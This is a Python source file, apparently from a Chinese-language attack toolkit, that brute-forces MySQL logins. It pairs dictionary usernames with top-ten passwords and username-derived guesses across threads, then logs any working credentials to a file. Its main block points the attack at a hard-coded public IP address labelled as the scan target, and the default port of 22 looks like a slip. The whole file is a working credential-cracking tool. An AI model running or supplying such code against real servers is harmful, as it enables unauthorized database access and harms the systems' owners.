import time

from conf.conf import base_root
from lib.file.file_Class import readFile,writeFile
from lib.net.connect_mysql import connect_mysql
from module.pwdCrack import getUserNameAlikePwd
from lib.core.w_threadPool import MyThreadPool

def weakPwdCrack_mysql(ip,port=None,user_list=None,pwd_list=None,resultFile=None,database=None):
    if resultFile == None:
        resultFile = '{}result/{}_{}.txt'.format(base_root,ip,time.time())

    if port == None:
        port = 22

    if user_list == None:
        user_list = readFile('{}payload/dict/user_database.txt'.format(base_root))

    if pwd_list == None:
        pwd_list = readFile('{}payload/dict/passwd_top10.txt'.format(base_root))

    if database==None:
        database = 'mysql'

    #生成在多线程里使用的关键函数
    def connectMysql_forThread(passwd,otherArgs):
        ip = otherArgs['ip']
        port = otherArgs['port']
        user = otherArgs['user']
        database = otherArgs['database']
        passwd = passwd.strip()
        print('crack user:[{}]/pwd:[{}]'.format(user, passwd))
        (flag, userAndpwd) = connect_mysql(ip,port=port,user=user,password=passwd,database=database)
        if flag:
            print('[FOUND] user:[{}]/pwd:[{}],result out is [{}]'.format(user, passwd,userAndpwd))
            time.sleep(1.5)  # 多线程写入文件时，可能存在条件竞争，添加睡眠时间尽可能防止其出现
            writeFile(resultFile, '[user:[{}]/pwd:[{}]\r\n'.format(user, passwd))
            time.sleep(1.5)  # 多线程写入文件时，可能存在条件竞争，添加睡眠时间尽可能防止其出现

    #爆破和用户名相似的密码
    for user in user_list:
        user = user.strip()
        userNameAlikePwd = getUserNameAlikePwd(user)
        otherArgs = {'ip': ip, 'user': user, 'port': port, 'database': database}
        crackFtpThread = MyThreadPool(connectMysql_forThread, userNameAlikePwd, other_args=otherArgs)
        crackFtpThread.start()

    # 爆破字典里面的密码
    for user in user_list:
        user = user.strip()
        otherArgs = {'ip':ip,'user':user,'port':port,'database':database}
        crackFtpThread = MyThreadPool(connectMysql_forThread,pwd_list,other_args=otherArgs)
        crackFtpThread.start()

if __name__ == '__main__':
    last_time = time.time()
    # pwd_list = readFile('{}payload/dict/passwd_1w.txt'.format(base_root))
    pwd_list = readFile('{}payload/dict/passwd_top10.txt'.format(base_root))
    ip = '167.88.178.54'  # 扫描目标
    weakPwdCrack_mysql(ip,pwd_list=pwd_list)
    print('total time is {}'.format(time.time() - last_time))
